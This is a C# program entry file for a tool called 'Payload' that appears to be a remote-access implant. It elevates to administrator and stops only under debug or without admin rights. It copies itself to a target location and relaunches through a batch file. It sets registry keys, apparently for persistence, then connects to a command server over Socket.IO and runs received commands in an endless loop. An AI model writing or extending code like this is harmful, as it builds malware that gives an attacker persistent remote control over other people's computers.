using Payload.Command;
using Payload.Core.Command;
using static CommonClassLibrary.Common.AppExitEvent;
using CommonClassLibrary;

if (args.Any(argument => string.Equals(argument, "--canonical", StringComparison.OrdinalIgnoreCase)))
{
    return await Payload.CanonicalAgentHost.RunAsync(args);
}

new KillOtherMeFactory().CreateCommand().Execute();
new CallAdminFactory().CreateCommand().Execute();

if (Config.IsDebug() || !Config.Instance.IsUserAdministrator())
{
    Console.WriteLine(Config.IsDebug()?"Safe Lock":"Non-Admin");
    return;
}

if (!Config.Instance.CheckWorkingTarget())
{
    CopyItselfCommand CopyItselfCommand = new CopyItselfFactory().CreateCommand();
    CopyItselfCommand.Undo();
    CopyItselfCommand.Execute();
    new StartProcessBatFactory().CreateCommand().Execute();
    return;
}

new RegistryKeyBatFactory().CreateCommand().Execute();

var payloadSocketClient = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);

DefaultConsoleCtrlHandler(
    () => {
        payloadSocketClient.StopClient();
    });

while (true)
{
    CommandManager.Instance.Run();
    Thread.Sleep(Config.Instance.MainSleepInterval);
}
